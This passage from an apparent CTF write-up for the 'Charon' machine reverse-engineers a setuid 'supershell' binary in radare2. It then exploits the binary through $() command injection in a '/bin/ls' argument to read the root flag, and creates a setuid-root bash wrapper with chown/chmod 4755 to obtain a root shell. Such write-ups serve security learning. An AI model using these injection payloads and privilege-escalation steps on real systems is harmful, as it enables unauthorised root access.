AAAAANAGQAAAAAAA0AYAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAJ0AAAAB
AAAABgAAAAAAAADgBkAAAAAAAOAGAAAAAAAA0gIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAA
AACjAAAAAQAAAAYAAAAAAAAAtAlAAAAAAAC0CQAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAA
AAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAAMAJQAAAAAAAwAkAAAAAAABSAAAAAAAAAAAAAAAAAAAA
BAAAAAAAAAAAAAAAAAAAALEAAAABAAAAAgAAAAAAAAAUCkAAAAAAABQKAAAAAAAAPAAAAAAAAAAA
AAAAAAAAAAQAAAAAAAAAAAAAAAAAAAC/AAAAAQAAAAIAAAAAAAAAUApAAAAAAABQCgAAAAAAABwB
AAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAyQAAAA4AAAADAAAAAAAAABAOYAAAAAAAEA4A
AAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAANUAAAAPAAAAAwAAAAAAAAAYDmAA
AAAAABgOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADhAAAAAQAAAAMAAAAA
AAAAIA5gAAAAAAAgDgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA5gAAAAYA
AAADAAAAAAAAACgOYAAAAAAAKA4AAAAAAADQAQAAAAAAAAYAAAAAAAAACAAAAAAAAAAQAAAAAAAA
AJgAAAABAAAAAwAAAAAAAAD4D2AAAAAAAPgPAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAA
CAAAAAAAAADvAAAAAQAAAAMAAAAAAAAAABBgAAAAAAAAEAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAI
AAAAAAAAAAgAAAAAAAAA+AAAAAEAAAADAAAAAAAAAHAQYAAAAAAAcBAAAAAAAAAQAAAAAAAAAAAA
AAAAAAAACAAAAAAAAAAAAAAAAAAAAP4AAAAIAAAAAwAAAAAAAACAEGAAAAAAAIAQAAAAAAAACAAA
AAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAADAQAAAQAAADAAAAAAAAAAAAAAAAAAAACAEAAA
AAAAADQAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAA
AAAAzRoAAAAAAAAMAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAACAAAAAAAAAAAA
AAAAAAAAAAAAALgQAAAAAAAAOAcAAAAAAAAeAAAALwAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAA
AAAAAAAAAAAAAAAAAAAAAADwFwAAAAAAAN0CAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
$
```

```sh
root@kali:~/charon# nano supershell.b64
root@kali:~/charon# base64 -d supershell.b64 > supershell
root@kali:~/charon# chmod +x supershell
root@kali:~/charon# ./supershell
Supershell (very beta)
usage: supershell <cmd>
root@kali:~/charon#
root@kali:~/charon# file supershell
supershell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9374712474f609ce0827a961cd90d43ec204743f, not stripped
root@kali:~/charon#
```

![](images/49.png)

![](images/50.png)

![](images/51.png)

![](images/52.png)

![](images/53.png)

```sh
root@kali:~/charon# r2 supershell
[0x004006e0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x004006e0]> afl
0x004005f0    3 26           sym._init
0x00400620    1 6            sym.imp.strncpy
0x00400630    1 6            sym.imp.strncmp
0x00400640    1 6            sym.imp.puts
0x00400650    1 6            sym.imp.strlen
0x00400660    1 6            sym.imp.__stack_chk_fail
0x00400670    1 6            sym.imp.system
0x00400680    1 6            sym.imp.printf
0x00400690    1 6            sym.imp.strcspn
0x004006a0    1 6            sym.imp.__libc_start_main
0x004006b0    1 6            sym.imp.exit
0x004006c0    1 6            sym.imp.setuid
0x004006d0    1 6            sub.__gmon_start_6d0
0x004006e0    1 41           entry0
0x00400710    4 50   -> 41   sym.deregister_tm_clones
0x00400750    3 53           sym.register_tm_clones
0x00400790    3 28           sym.__do_global_dtors_aux
0x004007b0    4 38   -> 35   entry1.init
0x004007d6    6 89           sym.tonto_chi_legge
0x0040082f    9 260          sym.main
0x00400940    4 101          sym.__libc_csu_init
0x004009b0    1 2            sym.__libc_csu_fini
0x004009b4    1 9            sym._fini
[0x004006e0]> s sym.main
[0x0040082f]> pdf
            ;-- main:
/ (fcn) sym.main 260
|   sym.main ();
|           ; var int local_120h @ rbp-0x120
|           ; var int local_114h @ rbp-0x114
|           ; var int local_110h @ rbp-0x110
|           ; var int local_8h @ rbp-0x8
|           ; DATA XREF from 0x004006fd (entry0)
|           0x0040082f      55             push rbp
|           0x00400830      4889e5         mov rbp, rsp
|           0x00400833      4881ec200100.  sub rsp, 0x120
|           0x0040083a      89bdecfeffff   mov dword [local_114h], edi
|           0x00400840      4889b5e0feff.  mov qword [local_120h], rsi
|           0x00400847      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; '(' ; 40
|           0x00400850      488945f8       mov qword [local_8h], rax
|           0x00400854      31c0           xor eax, eax
|           0x00400856      bfd3094000     mov edi, str.Supershell__very_beta ; 0x4009d3 ; "Supershell (very beta)"
|           0x0040085b      e8e0fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400860      83bdecfeffff.  cmp dword [local_114h], 2   ; [0x2:4]=-1 ; 2
|       ,=< 0x00400867      7414           je 0x40087d
|       |   0x00400869      bfea094000     mov edi, str.usage:_supershell__cmd ; 0x4009ea ; "usage: supershell <cmd>"
|       |   0x0040086e      e8cdfdffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00400873      bf01000000     mov edi, 1
|       |   0x00400878      e833feffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x00400867 (sym.main)
|       `-> 0x0040087d      488b85e0feff.  mov rax, qword [local_120h]
|           0x00400884      4883c008       add rax, 8
|           0x00400888      488b08         mov rcx, qword [rax]
|           0x0040088b      488d85f0feff.  lea rax, qword [local_110h]
|           0x00400892      baff000000     mov edx, 0xff               ; 255
|           0x00400897      4889ce         mov rsi, rcx
|           0x0040089a      4889c7         mov rdi, rax
|           0x0040089d      e87efdffff     call sym.imp.strncpy        ; char *strncpy(char *dest, const char *src, size_t  n)
|           0x004008a2      488d85f0feff.  lea rax, qword [local_110h]
|           0x004008a9      4889c7         mov rdi, rax
|           0x004008ac      e825ffffff     call sym.tonto_chi_legge
|           0x004008b1      85c0           test eax, eax
|       ,=< 0x004008b3      740a           je 0x4008bf
|       |   0x004008b5      bf01000000     mov edi, 1
|       |   0x004008ba      e8f1fdffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x004008b3 (sym.main)
|       `-> 0x004008bf      488d85f0feff.  lea rax, qword [local_110h]
|           0x004008c6      ba07000000     mov edx, 7
|           0x004008cb      be020a4000     mov esi, str.bin_ls         ; 0x400a02 ; "/bin/ls"
|           0x004008d0      4889c7         mov rdi, rax
|           0x004008d3      e858fdffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)
|           0x004008d8      85c0           test eax, eax
|       ,=< 0x004008da      753c           jne 0x400918
|       |   0x004008dc      488d85f0feff.  lea rax, qword [local_110h]
|       |   0x004008e3      4889c6         mov rsi, rax
|       |   0x004008e6      bf0a0a4000     mov edi, str.s              ; 0x400a0a ; "++[%s]\n"
|       |   0x004008eb      b800000000     mov eax, 0
|       |   0x004008f0      e88bfdffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x004008f5      bf00000000     mov edi, 0
|       |   0x004008fa      b800000000     mov eax, 0
|       |   0x004008ff      e8bcfdffff     call sym.imp.setuid
|       |   0x00400904      488d85f0feff.  lea rax, qword [local_110h]
|       |   0x0040090b      4889c7         mov rdi, rax
|       |   0x0040090e      b800000000     mov eax, 0
|       |   0x00400913      e858fdffff     call sym.imp.system         ; int system(const char *string)
|       |   ; JMP XREF from 0x004008da (sym.main)
|       `-> 0x00400918      b800000000     mov eax, 0
|           0x0040091d      488b55f8       mov rdx, qword [local_8h]
|           0x00400921      644833142528.  xor rdx, qword fs:[0x28]
|       ,=< 0x0040092a      7405           je 0x400931
|       |   0x0040092c      e82ffdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; JMP XREF from 0x0040092a (sym.main)
|       `-> 0x00400931      c9             leave
\           0x00400932      c3             ret
[0x0040082f]> VV
```

![](images/54.png)

![](images/55.png)

![](images/56.png)

```sh
$ /usr/local/bin/supershell
Supershell (very beta)
usage: supershell <cmd>
$
```

```sh
$ /usr/local/bin/supershell /bin/ls
Supershell (very beta)
++[/bin/ls]
decoder.pub  pass.crypt  user.txt
$
```

```sh
$ /usr/local/bin/supershell '/bin/ls$(cat /root/root.txt)'
Supershell (very beta)
++[/bin/ls$(cat /root/root.txt)]
sh: 1: /bin/lsc59a840463acc6ca14f6599721c9c18e: not found
$
```

`shell.c`

```c
#include <unistd.h>
#include <errno.h>

main( int argc, char ** argv, char ** envp )
{
	setuid(0);
	setgid(0);
	envp = 0;
	system("/bin/bash", argv, envp);
	return;
}
```

```sh
$ cd /tmp
$ ls -l
total 8
prw-r--r-- 1 www-data www-data    0 May 31 07:46 f
drwx------ 3 root     root     4096 May 28 04:21 systemd-private-b35313cd623349799a051977158d3299-systemd-timesyncd.service-J8y7lF
drwx------ 2 root     root     4096 May 28 04:21 vmware-root
$ vi shell.c
$ gcc shell.c -o shell
shell.c:4:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main( int argc, char ** argv, char ** envp )
 ^
shell.c: In function ‘main’:
shell.c:9:2: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
  system("/bin/bash", argv, envp);
  ^
shell.c:10:2: warning: ‘return’ with no value, in function returning non-void
  return;
  ^
$ ls -l
total 24
prw-r--r-- 1 www-data www-data    0 May 31 07:46 f
-rwxr-xr-x 1 decoder  freeeze  8712 May 31 10:04 shell
-rw-r--r-- 1 decoder  freeeze   167 May 31 10:04 shell.c
drwx------ 3 root     root     4096 May 28 04:21 systemd-private-b35313cd623349799a051977158d3299-systemd-timesyncd.service-J8y7lF
drwx------ 2 root     root     4096 May 28 04:21 vmware-root
$
```

```sh
$ ls -l
total 24
prw-r--r-- 1 www-data www-data    0 May 31 07:46 f
-rwxr-xr-x 1 root     root     8712 May 31 10:04 shell
-rw-r--r-- 1 decoder  freeeze   167 May 31 10:04 shell.c
drwx------ 3 root     root     4096 May 28 04:21 systemd-private-b35313cd623349799a051977158d3299-systemd-timesyncd.service-J8y7lF
drwx------ 2 root     root     4096 May 28 04:21 vmware-root
$
$ /usr/local/bin/supershell "/bin/ls \$(chown root:root /tmp/shell)"
Supershell (very beta)
++[/bin/ls $(chown root:root /tmp/shell)]
f  shell  shell.c  systemd-private-b35313cd623349799a051977158d3299-systemd-timesyncd.service-J8y7lF  vmware-root
$
$ /usr/local/bin/supershell "/bin/ls \$(chmod 4755 /tmp/shell)"
Supershell (very beta)
++[/bin/ls $(chmod 4755 /tmp/shell)]
f  shell  shell.c  systemd-private-b35313cd623349799a051977158d3299-systemd-timesyncd.service-J8y7lF  vmware-root
$
$ ls -l
total 24
prw-r--r-- 1 www-data www-data    0 May 31 07:46 f
-rwsr-xr-x 1 root     root     8712 May 31 10:04 shell
-rw-r--r-- 1 decoder  freeeze   167 May 31 10:04 shell.c
drwx------ 3 root     root     4096 May 28 04:21 systemd-private-b35313cd623349799a051977158d3299-systemd-timesyncd.service-J8y7lF
drwx------ 2 root     root     4096 May 28 04:21 vmware-root
$
$ id
uid=1001(decoder) gid=1001(freeeze) groups=1001(freeeze)
$
$ ./shell
root@charon:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(freeeze)
root@charon:/tmp#
root@charon:/tmp# cat /root/root.txt
c59a840463acc6ca14f6599721c9c18e
root@charon:/tmp#
```